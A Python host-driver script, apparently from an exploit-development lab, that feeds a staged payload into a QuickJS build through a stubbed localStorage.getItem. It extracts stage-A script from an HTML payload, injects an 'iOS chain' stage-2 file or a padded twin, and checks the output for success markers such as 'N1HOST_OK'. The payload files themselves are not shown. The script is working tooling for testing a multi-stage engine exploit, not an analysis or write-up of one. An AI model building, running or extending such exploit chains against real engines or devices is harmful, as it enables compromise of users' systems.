#!/usr/bin/env python3
"""Host driver for the localStorage exploit: localStorage.getItem stub."""
import json, os, re, subprocess, sys
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE)
ROOT=os.path.dirname(os.path.dirname(LAB)); PAY=os.path.join(LAB,'payload')
B=open(os.path.join(ROOT,'lab','qjs_postsnapshot','ios_n1','payload','n1ios_stage2_ab72.js')).read()
TWIN=open('/tmp/opencode/ios_chain_20261108/stage2_host_twin_fixed.js').read()
TWIN_PAD=TWIN+'/*'+'A'*(len(B)-len(TWIN)-4)+'*/'
assert len(TWIN_PAD)==len(B)
def stage_a(html): return re.findall(r'<script>(.*?)</script>',html,re.S)[0]
def driver(a,s2):
    return ('var __v={textContent:""};\n'
            'globalThis.document={getElementById:function(id){if(id==="v")return __v;return null;}};\n'
            'globalThis.localStorage={getItem:function(k){return '+json.dumps(s2)+';},setItem:function(k,v){}};\n'
            +a+'\nglobalThis.RESULT="DRIVER "+globalThis.RESULT+" V="+__v.textContent;\n')
def run(html,s2,label,n=3):
    a=stage_a(html); open('/tmp/opencode/ls_driver.js','w').write(driver(a,s2)); out=[]
    for k in range(n):
        p=subprocess.run(['/tmp/opencode/qjs017/build/app_multi','/tmp/opencode/ls_driver.js'],capture_output=True,text=True,env={**os.environ,'QJS_HEAP_LIMIT':'8388608'})
        txt=p.stderr+p.stdout; m=re.search(r'(LS C=34[^\n]*)',txt)
        out.append((p.returncode,m.group(1) if m else 'NO_RESULT','N1HOST_OK' in txt))
    print(label,out[:3])
if __name__=='__main__':
    H=int(sys.argv[1]) if len(sys.argv)>1 else 400
    html=open(os.path.join(PAY,f'ls_final_h{H}.html')).read()
    run(html,'/*'+'A'*(len(B)-4)+'*/',f'H={H} inert'); run(html,B,f'H={H} stageB'); run(html,TWIN_PAD,f'H={H} twin')
